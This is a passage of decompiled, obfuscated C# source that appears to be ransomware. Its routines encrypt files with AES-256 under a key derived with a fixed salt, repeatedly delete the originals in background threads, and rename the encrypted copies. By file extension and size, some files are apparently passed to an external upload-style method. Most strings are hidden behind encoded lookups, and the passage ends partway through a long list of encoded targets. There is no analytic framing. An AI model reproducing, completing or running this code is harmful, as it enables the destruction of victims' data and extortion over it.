											File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107392314) + ex6.Message + ZDnnujygFIro.getString_0(107396678));
										}
										catch (Exception)
										{
										}
									}
									aZPMuiXAvDSZE++;
									return;
								}
							}
						}
						else if (!krgzddxGYNU)
						{
							if (!nXPdGXfAViu)
							{
								TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107392291), CTCLDhOBQHDRqgI);
							}
							else
							{
								TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107392291), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nXPdGXfAViu)
								{
									OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA, CTCLDhOBQHDRqgI);
								}
								else
								{
									OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ySPgVCqYcWT)
								{
									try
									{
										File.AppendAllText(NarcQCMbbNaqtU, ZDnnujygFIro.getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + ZDnnujygFIro.getString_0(107392314) + ex8.Message + ZDnnujygFIro.getString_0(107396678));
									}
									catch (Exception)
									{
									}
								}
								aZPMuiXAvDSZE++;
								return;
							}
						}
						if (nXPdGXfAViu)
						{
							if (CS_0024_003C_003E8__locals0.GvpVQWXxwr != ZDnnujygFIro.getString_0(107392296))
							{
								qJuIVZQcNrI(CS_0024_003C_003E8__locals0.zludOANeWNA + CS_0024_003C_003E8__locals0.GvpVQWXxwr, bytes2);
							}
							else
							{
								qJuIVZQcNrI(CS_0024_003C_003E8__locals0.zludOANeWNA, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.nDEsfoHIbnEr.Remove(CS_0024_003C_003E8__locals0.zludOANeWNA);
		});
	}

	private static void XeYpTlvZyMmWRm(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (OVQFJzgWysqwhUU == getString_0(107396835))
					{
						foreach (string item in PAVedODhIceUP)
						{
							if (string_0.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396835))
							{
								if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396840))
							{
								try
								{
									vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107392274)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107392274), getString_0(107395158)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void OCFRJwPDGkuTGlhs(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (OVQFJzgWysqwhUU == getString_0(107396835))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in PAVedODhIceUP)
			{
				if (string_0.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396835))
				{
					if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396840))
				{
					try
					{
						vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = uSVNzpcBrR.YOpbVsOnwFaxe(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		ePwuTuiAXFH++;
	}

	private static void TPDGCdwrJXWli(string string_0, string string_1, byte[] byte_0)
	{
		AmBvdoDqdIwyaKw CS_0024_003C_003E8__locals0 = new AmBvdoDqdIwyaKw();
		CS_0024_003C_003E8__locals0.lLaxVxomDLNRz = string_0;
		CS_0024_003C_003E8__locals0.eoxUrRKXuGW = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string eoxUrRKXuGW = CS_0024_003C_003E8__locals0.eoxUrRKXuGW;
			FileStream fileStream = new FileStream(eoxUrRKXuGW, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (YCyjCQiwEiQ == getString_0(107396835))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.lLaxVxomDLNRz, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.lLaxVxomDLNRz, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.lLaxVxomDLNRz, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.eoxUrRKXuGW.Length > 0)
				{
					if (OVQFJzgWysqwhUU == getString_0(107396835))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.lLaxVxomDLNRz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in PAVedODhIceUP)
						{
							if (CS_0024_003C_003E8__locals0.lLaxVxomDLNRz.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396835))
							{
								if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), CS_0024_003C_003E8__locals0.lLaxVxomDLNRz);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.lLaxVxomDLNRz.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396840))
							{
								try
								{
									vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394759), getString_0(107394754), getString_0(107394709), CS_0024_003C_003E8__locals0.lLaxVxomDLNRz);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.lLaxVxomDLNRz);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.eoxUrRKXuGW.EndsWith(getString_0(107392274)))
					{
						File.Move(CS_0024_003C_003E8__locals0.eoxUrRKXuGW, CS_0024_003C_003E8__locals0.eoxUrRKXuGW.Replace(getString_0(107392274), getString_0(107395158)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.eoxUrRKXuGW))
							{
								File.Delete(CS_0024_003C_003E8__locals0.eoxUrRKXuGW);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393043) + CS_0024_003C_003E8__locals0.lLaxVxomDLNRz + getString_0(107392297) + ex2.Message + getString_0(107396661));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> iHpJZCadsoQtVF = IHpJZCadsoQtVF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				zbzRUHIEDzWaHHIW(getString_0(107392212), string_0);
			};
		}
		Parallel.ForEach(iHpJZCadsoQtVF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> xXTcJnsSin = XXTcJnsSin;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				zbzRUHIEDzWaHHIW(getString_0(107392235), string_0);
			};
		}
		Parallel.ForEach(xXTcJnsSin, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> euyTUVwaghbjWq = EuyTUVwaghbjWq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), string_0);
			};
		}
		Parallel.ForEach(euyTUVwaghbjWq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (LhiuvUHhkI == getString_0(107396835))
		{
			string[] source = geAadizFUr;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), getString_0(107392197) + string_0 + getString_0(107392188));
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!sTsovardsxZr().Contains(getString_0(107392909)))
		{
			OwJdeQnBeVULEVel(abdHCeUGVK);
		}
		else
		{
			List<string> yxhEsnxKVPVIG = YxhEsnxKVPVIG;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(bnFgySFPvGNkn(getString_0(107392151))), string_0);
				};
			}
			Parallel.ForEach(yxhEsnxKVPVIG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> source2 = mTjzKFABFlRPD;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392158)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> source3 = iSBgDeZeUJkg;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				zbzRUHIEDzWaHHIW(getString_0(107392109), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		zbzRUHIEDzWaHHIW(getString_0(107392212), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		zbzRUHIEDzWaHHIW(getString_0(107392235), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), getString_0(107392197) + string_0 + getString_0(107392188));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(bnFgySFPvGNkn(getString_0(107392151))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392158)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		zbzRUHIEDzWaHHIW(getString_0(107392109), string_0);
	}

	static atvFwvQCkKwzkN()
	{
		Strings.CreateGetStringDelegate(typeof(atvFwvQCkKwzkN));
		VHsLiUKFfidwWXR = getString_0(107395134);
		CTCLDhOBQHDRqgI = null;
		wTnoFuArjqi = getString_0(107396840);
		sdLJpoenlCvgq = getString_0(107392132);
		lXkxRPeRNZ = new List<string>();
		KOdpTUTkhTTKgck = new List<string>();
		imBstcBDQISzV = getString_0(107396840);
		xlYLjVrSvCTxIOZJ = getString_0(107395158);
		sSCSYzLRGQ = getString_0(107395158);
		cMOYTgWgGzGu = getString_0(107396840);
		HttjUNgZVMdF = 0;
		quvSuKnnGqdfeN = getString_0(107396840);
		tkOWDxFxUWicNm = getString_0(107396840);
		FbrxAxGStlnzYU = getString_0(107396840);
		JTRTIuEOTvuh = getString_0(107392599);
		isMcXCRePGXWj = getString_0(107396840);
		pnTyIVzOwj = getString_0(107396840);
		xbWzJPCNNlGDGm = getString_0(107396840);
		mqdGbQaLPms = getString_0(107396840);
		BlKPvBRBvxfSTW = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107392594)),
			iWzroveCagNOUOgR(getString_0(107392609)),
			iWzroveCagNOUOgR(getString_0(107392584)),
			iWzroveCagNOUOgR(getString_0(107392535)),
			iWzroveCagNOUOgR(getString_0(107392542)),
			iWzroveCagNOUOgR(getString_0(107392517)),
			iWzroveCagNOUOgR(getString_0(107392468)),
			iWzroveCagNOUOgR(getString_0(107392443)),
			iWzroveCagNOUOgR(getString_0(107392450)),
			iWzroveCagNOUOgR(getString_0(107392425)),
			iWzroveCagNOUOgR(getString_0(107392376)),
			iWzroveCagNOUOgR(getString_0(107392383)),
			iWzroveCagNOUOgR(getString_0(107391846))
		};
		MembHkBRQEG = new List<string>();
		JaKxooYLUGf = getString_0(107396840);
		horNorVByMaUksf = getString_0(107396840);
		sGjvlsQPGLsZQ = getString_0(107396840);
		wxtQncBrNHcAfj = new List<string>();
		ZznCoKAHwMURezBPhT = getString_0(107396840);
		mgPKyvtQeNO = getString_0(107391789);
		wqnSIjxqtFtHR = getString_0(107396840);
		dYzKVbNCMPY = getString_0(107396840);
		XXTcJnsSin = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107391772)),
			iWzroveCagNOUOgR(getString_0(107391707)),
			iWzroveCagNOUOgR(getString_0(107391674)),
			iWzroveCagNOUOgR(getString_0(107391641)),
			iWzroveCagNOUOgR(getString_0(107391608)),
			iWzroveCagNOUOgR(getString_0(107392091)),
			iWzroveCagNOUOgR(getString_0(107392066)),
			iWzroveCagNOUOgR(getString_0(107392037)),
			iWzroveCagNOUOgR(getString_0(107391960)),
			iWzroveCagNOUOgR(getString_0(107391895)),
			iWzroveCagNOUOgR(getString_0(107391862)),
			iWzroveCagNOUOgR(getString_0(107391317)),
			iWzroveCagNOUOgR(getString_0(107391284)),
			iWzroveCagNOUOgR(getString_0(107391255)),
			iWzroveCagNOUOgR(getString_0(107391226)),
			iWzroveCagNOUOgR(getString_0(107391185)),
			iWzroveCagNOUOgR(getString_0(107391176)),
			iWzroveCagNOUOgR(getString_0(107391087)),
			iWzroveCagNOUOgR(getString_0(107391582)),
			iWzroveCagNOUOgR(getString_0(107391549)),
			iWzroveCagNOUOgR(getString_0(107391520)),
			iWzroveCagNOUOgR(getString_0(107391447)),
			iWzroveCagNOUOgR(getString_0(107391406)),
			iWzroveCagNOUOgR(getString_0(107391373)),
			iWzroveCagNOUOgR(getString_0(107391356)),
			iWzroveCagNOUOgR(getString_0(107390787)),
			iWzroveCagNOUOgR(getString_0(107390714)),
			iWzroveCagNOUOgR(getString_0(107390717)),
			iWzroveCagNOUOgR(getString_0(107390644)),
			iWzroveCagNOUOgR(getString_0(107390587)),
			iWzroveCagNOUOgR(getString_0(107391034)),
			iWzroveCagNOUOgR(getString_0(107391009)),
			iWzroveCagNOUOgR(getString_0(107390944)),
			iWzroveCagNOUOgR(getString_0(107390863)),
			iWzroveCagNOUOgR(getString_0(107390286)),
			iWzroveCagNOUOgR(getString_0(107390229)),
			iWzroveCagNOUOgR(getString_0(107390196)),
			iWzroveCagNOUOgR(getString_0(107390187)),
			iWzroveCagNOUOgR(getString_0(107390146)),
			iWzroveCagNOUOgR(getString_0(107390069)),
			iWzroveCagNOUOgR(getString_0(107390552)),
			iWzroveCagNOUOgR(getString_0(107390487)),
			iWzroveCagNOUOgR(getString_0(107390446)),
			iWzroveCagNOUOgR(getString_0(107390413)),
			iWzroveCagNOUOgR(getString_0(107390404)),
			iWzroveCagNOUOgR(getString_0(107390323)),
			iWzroveCagNOUOgR(getString_0(107389798)),
			iWzroveCagNOUOgR(getString_0(107389725)),
			iWzroveCagNOUOgR(getString_0(107389648)),
			iWzroveCagNOUOgR(getString_0(107389635)),
			iWzroveCagNOUOgR(getString_0(107389558)),
			iWzroveCagNOUOgR(getString_0(107390029)),
			iWzroveCagNOUOgR(getString_0(107389988)),
			iWzroveCagNOUOgR(getString_0(107389959)),
			iWzroveCagNOUOgR(getString_0(107389918)),
			iWzroveCagNOUOgR(getString_0(107389853)),
			iWzroveCagNOUOgR(getString_0(107389264)),
			iWzroveCagNOUOgR(getString_0(107389235)),
			iWzroveCagNOUOgR(getString_0(107389222)),
			iWzroveCagNOUOgR(getString_0(107389157)),
			iWzroveCagNOUOgR(getString_0(107389128)),
			iWzroveCagNOUOgR(getString_0(107389039)),
			iWzroveCagNOUOgR(getString_0(107389486)),
			iWzroveCagNOUOgR(getString_0(107389477)),
			iWzroveCagNOUOgR(getString_0(107389448)),
			iWzroveCagNOUOgR(getString_0(107389407)),
			iWzroveCagNOUOgR(getString_0(107389294)),
			iWzroveCagNOUOgR(getString_0(107388721)),
			iWzroveCagNOUOgR(getString_0(107388680)),
			iWzroveCagNOUOgR(getString_0(107388603)),
			iWzroveCagNOUOgR(getString_0(107388570)),
			iWzroveCagNOUOgR(getString_0(107388529)),
			iWzroveCagNOUOgR(getString_0(107388996)),
			iWzroveCagNOUOgR(getString_0(107388919)),
			iWzroveCagNOUOgR(getString_0(107388862)),
			iWzroveCagNOUOgR(getString_0(107388781)),
			iWzroveCagNOUOgR(getString_0(107388240)),
			iWzroveCagNOUOgR(getString_0(107388231)),
			iWzroveCagNOUOgR(getString_0(107388166)),
			iWzroveCagNOUOgR(getString_0(107388085)),
			iWzroveCagNOUOgR(getString_0(107388060)),
			iWzroveCagNOUOgR(getString_0(107388507)),
			iWzroveCagNOUOgR(getString_0(107388478)),
			iWzroveCagNOUOgR(getString_0(107388421)),
			iWzroveCagNOUOgR(getString_0(107390229)),
			iWzroveCagNOUOgR(getString_0(107388332)),
			iWzroveCagNOUOgR(getString_0(107388323)),
			iWzroveCagNOUOgR(getString_0(107387722)),
			iWzroveCagNOUOgR(getString_0(107387677)),
			iWzroveCagNOUOgR(getString_0(107387616)),
			iWzroveCagNOUOgR(getString_0(107387591)),
			iWzroveCagNOUOgR(getString_0(107387514)),
			iWzroveCagNOUOgR(getString_0(107388009)),
			iWzroveCagNOUOgR(getString_0(107390587)),
			iWzroveCagNOUOgR(getString_0(107387944)),
			iWzroveCagNOUOgR(getString_0(107387903)),
			iWzroveCagNOUOgR(getString_0(107387846)),
			iWzroveCagNOUOgR(getString_0(107391034)),
			iWzroveCagNOUOgR(getString_0(107387773)),
			iWzroveCagNOUOgR(getString_0(107387180)),
			iWzroveCagNOUOgR(getString_0(107387091)),
			iWzroveCagNOUOgR(getString_0(107387026)),
			iWzroveCagNOUOgR(getString_0(107387009)),
			iWzroveCagNOUOgR(getString_0(107390944)),
			iWzroveCagNOUOgR(getString_0(107387412)),
			iWzroveCagNOUOgR(getString_0(107390196)),
			iWzroveCagNOUOgR(getString_0(107390863)),
			iWzroveCagNOUOgR(getString_0(107387379)),
			iWzroveCagNOUOgR(getString_0(107387322)),
			iWzroveCagNOUOgR(getString_0(107390286)),
			iWzroveCagNOUOgR(getString_0(107387289)),
			iWzroveCagNOUOgR(getString_0(107387272)),
			iWzroveCagNOUOgR(getString_0(107386679)),
			iWzroveCagNOUOgR(getString_0(107390644)),
			iWzroveCagNOUOgR(getString_0(107386686)),
			iWzroveCagNOUOgR(getString_0(107386609)),
			iWzroveCagNOUOgR(getString_0(107386580)),
			iWzroveCagNOUOgR(getString_0(107386551)),
			iWzroveCagNOUOgR(getString_0(107386538)),
			iWzroveCagNOUOgR(getString_0(107386505)),
			iWzroveCagNOUOgR(getString_0(107386960)),
			iWzroveCagNOUOgR(getString_0(107386947)),
			iWzroveCagNOUOgR(getString_0(107386922)),
			iWzroveCagNOUOgR(getString_0(107386881)),
			iWzroveCagNOUOgR(getString_0(107386804)),
			iWzroveCagNOUOgR(getString_0(107386787)),
			iWzroveCagNOUOgR(getString_0(107386218)),
			iWzroveCagNOUOgR(getString_0(107386185)),
			iWzroveCagNOUOgR(getString_0(107386140)),
			iWzroveCagNOUOgR(getString_0(107386075)),
			iWzroveCagNOUOgR(getString_0(107386034)),
			iWzroveCagNOUOgR(getString_0(107390717)),
			iWzroveCagNOUOgR(getString_0(107386787)),
			iWzroveCagNOUOgR(getString_0(107386025)),
			iWzroveCagNOUOgR(getString_0(107385964)),
			iWzroveCagNOUOgR(getString_0(107386447)),
			iWzroveCagNOUOgR(getString_0(107386430)),
			iWzroveCagNOUOgR(getString_0(107386357)),
			iWzroveCagNOUOgR(getString_0(107386296)),
			iWzroveCagNOUOgR(getString_0(107386223)),
			iWzroveCagNOUOgR(getString_0(107385682)),
			iWzroveCagNOUOgR(getString_0(107385649)),
			iWzroveCagNOUOgR(getString_0(107385608)),
			iWzroveCagNOUOgR(getString_0(107385579)),
			iWzroveCagNOUOgR(getString_0(107385534)),
			iWzroveCagNOUOgR(getString_0(107385469)),
			iWzroveCagNOUOgR(getString_0(107385948)),
			iWzroveCagNOUOgR(getString_0(107385871)),
			iWzroveCagNOUOgR(getString_0(107385810)),
			iWzroveCagNOUOgR(getString_0(107385777)),
			iWzroveCagNOUOgR(getString_0(107385764)),
			iWzroveCagNOUOgR(getString_0(107385187)),
			iWzroveCagNOUOgR(getString_0(107385154)),
			iWzroveCagNOUOgR(getString_0(107385081)),
			iWzroveCagNOUOgR(getString_0(107385064)),
			iWzroveCagNOUOgR(getString_0(107391356)),
			iWzroveCagNOUOgR(getString_0(107385035)),
			iWzroveCagNOUOgR(getString_0(107384946)),
			iWzroveCagNOUOgR(getString_0(107385449)),
			iWzroveCagNOUOgR(getString_0(107385404)),
			iWzroveCagNOUOgR(getString_0(107385331)),
			iWzroveCagNOUOgR(getString_0(107385318)),
			iWzroveCagNOUOgR(getString_0(107385257)),
			iWzroveCagNOUOgR(getString_0(107384664)),
			iWzroveCagNOUOgR(getString_0(107384647)),
			iWzroveCagNOUOgR(getString_0(107384558)),
			iWzroveCagNOUOgR(getString_0(107384501)),
			iWzroveCagNOUOgR(getString_0(107384488)),
			iWzroveCagNOUOgR(getString_0(107384447)),
			iWzroveCagNOUOgR(getString_0(107384902)),
			iWzroveCagNOUOgR(getString_0(107390787)),
			iWzroveCagNOUOgR(getString_0(107384829)),
			iWzroveCagNOUOgR(getString_0(107384800)),
			iWzroveCagNOUOgR(getString_0(107384767)),
			iWzroveCagNOUOgR(getString_0(107384694)),
			iWzroveCagNOUOgR(getString_0(107384153)),
			iWzroveCagNOUOgR(getString_0(107391373)),
			iWzroveCagNOUOgR(getString_0(107384112)),
			iWzroveCagNOUOgR(getString_0(107384095)),
			iWzroveCagNOUOgR(getString_0(107384066)),
			iWzroveCagNOUOgR(getString_0(107389128)),
			iWzroveCagNOUOgR(getString_0(107384033)),
			iWzroveCagNOUOgR(getString_0(107384066)),
			iWzroveCagNOUOgR(getString_0(107384004)),
			iWzroveCagNOUOgR(getString_0(107383975)),
			iWzroveCagNOUOgR(getString_0(107383946)),
			iWzroveCagNOUOgR(getString_0(107384377)),
			iWzroveCagNOUOgR(getString_0(107384360)),
			iWzroveCagNOUOgR(getString_0(107384319)),
			iWzroveCagNOUOgR(getString_0(107384258)),
			iWzroveCagNOUOgR(getString_0(107384229)),
			iWzroveCagNOUOgR(getString_0(107384188)),
			iWzroveCagNOUOgR(getString_0(107383599)),
			iWzroveCagNOUOgR(getString_0(107383586)),
			iWzroveCagNOUOgR(getString_0(107383553)),
			iWzroveCagNOUOgR(getString_0(107383496)),
			iWzroveCagNOUOgR(getString_0(107383419)),
			iWzroveCagNOUOgR(getString_0(107383906)),
			iWzroveCagNOUOgR(getString_0(107383873)),
			iWzroveCagNOUOgR(getString_0(107383800)),
			iWzroveCagNOUOgR(getString_0(107383771)),
			iWzroveCagNOUOgR(getString_0(107383742)),
			iWzroveCagNOUOgR(getString_0(107383709)),
			iWzroveCagNOUOgR(getString_0(107383140)),
			iWzroveCagNOUOgR(getString_0(107383067)),
			iWzroveCagNOUOgR(getString_0(107383050)),
			iWzroveCagNOUOgR(getString_0(107383017)),
			iWzroveCagNOUOgR(getString_0(107382936)),
			iWzroveCagNOUOgR(getString_0(107382923)),
			iWzroveCagNOUOgR(getString_0(107383354)),
			iWzroveCagNOUOgR(getString_0(107383309)),
			iWzroveCagNOUOgR(getString_0(107383292)),
			iWzroveCagNOUOgR(getString_0(107383227)),
			iWzroveCagNOUOgR(getString_0(107383186)),
			iWzroveCagNOUOgR(getString_0(107383177)),
			iWzroveCagNOUOgR(getString_0(107382620)),
			iWzroveCagNOUOgR(getString_0(107386357)),
			iWzroveCagNOUOgR(getString_0(107382555)),
			iWzroveCagNOUOgR(getString_0(107382514)),
			iWzroveCagNOUOgR(getString_0(107382457)),
			iWzroveCagNOUOgR(getString_0(107382460)),
			iWzroveCagNOUOgR(getString_0(107382395)),
			iWzroveCagNOUOgR(getString_0(107382874)),
			iWzroveCagNOUOgR(getString_0(107382857)),
			iWzroveCagNOUOgR(getString_0(107382796)),
			iWzroveCagNOUOgR(getString_0(107382783)),
			iWzroveCagNOUOgR(getString_0(107382706)),
			iWzroveCagNOUOgR(getString_0(107382697)),
			iWzroveCagNOUOgR(getString_0(107382096)),
			iWzroveCagNOUOgR(getString_0(107382079)),
			iWzroveCagNOUOgR(getString_0(107382050)),
			iWzroveCagNOUOgR(getString_0(107381973))
		};
		IHpJZCadsoQtVF = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107381932)),
